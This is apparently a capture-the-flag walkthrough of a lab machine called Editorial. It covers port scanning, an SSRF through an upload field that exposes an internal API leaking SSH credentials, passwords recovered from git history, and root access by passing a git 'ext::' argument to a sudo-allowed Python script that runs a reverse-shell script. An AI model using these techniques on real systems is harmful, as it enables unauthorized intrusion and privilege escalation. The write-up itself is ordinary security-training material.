**Ping**
![[Pasted image 20240616144156.png]]

Nmap default Scan
```
nmap 10.10.11.20 -oN dnmap 
```
![[Pasted image 20240616144317.png]]

Nmap Script and Service Scan
```
nmap 10.10.11.20 -sV -sC -A -oN snmap
```
![[Pasted image 20240616144607.png]]

Nmap All port Scan
```
nmap -p- --min-rate 10000 10.10.11.20 -oN anmap
```
![[Pasted image 20240616144545.png]]

I have added the editorial.htb to my hosts file
![[Pasted image 20240616144700.png]]

On Port 80
![[Pasted image 20240616144730.png]]

Gobuster Scan Directory Traversal
```
gobuster dir -u http://editorial.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240616145236.png]]

/upload
![[Pasted image 20240616145358.png]]
![[Pasted image 20240616145426.png]]


I think this the vulnerable part
![[Pasted image 20240616162955.png]]

I'm getting request
![[Pasted image 20240616163025.png]]

Will check internal port 5000
![[Pasted image 20240616171142.png]]

Burp request/response
![[Pasted image 20240616171206.png]]

Followed by POST request for http://127.0.0.1:5000 Got a GET request and response automatically.
![[Pasted image 20240616171058.png]]
Can see some interesting endpoint info's.


Will try to retrieve the Information from endpoints We have got
```
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

This look's interesting
```
/api/latest/metadata/messages/authors
```
![[Pasted image 20240616173854.png]]

burp response
![[Pasted image 20240616173659.png]]

Followed by
![[Pasted image 20240616173810.png]]
Got the credentials.
```
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}
```

Will ssh now
```
ssh dev@10.10.11.20
```
Credentials
```
ssh session
username: dev
password: dev080217_devAPI!@
```
![[Pasted image 20240616174125.png]]
![[Pasted image 20240616174137.png]]

**Got user.txt**
![[Pasted image 20240616174414.png]]

Will  jump to Privilege Escalation....


We can se there is another directory **apps** 
![[Pasted image 20240616180115.png]]
we can also see there is .git directory

Look's interesting, will exploit git now
```
git log
```
![[Pasted image 20240616180216.png]]

We already know prod is another user in the machine, will analyse the commit
```
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```
![[Pasted image 20240616180454.png]]
Coool...!
We got the creds of user prod

Will switch to Prod
```
su prod
```
Credentials
```
username: prod
password: 080217_Producti0n_2023!@
```
![[Pasted image 20240616180617.png]]
Niceeeee:)

Will see Prod's sudo Privileges
![[Pasted image 20240616185136.png]]
Nice, we can run a python program as root

Will check the permission for the file
![[Pasted image 20240616185300.png]]
We only have read and execute access, but it has wildcard *

Created a bash script for reverse shell
![[Pasted image 20240616185423.png]]

Transferred to target machine /tmp directory
![[Pasted image 20240616185521.png]]

Time to abuse the python code with our script
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::/tmp/rev.sh'
```
![[Pasted image 20240616185611.png]]

Got reverse shell as root
![[Pasted image 20240616185642.png]]

**Got root.txt**
![[Pasted image 20240616185723.png]]




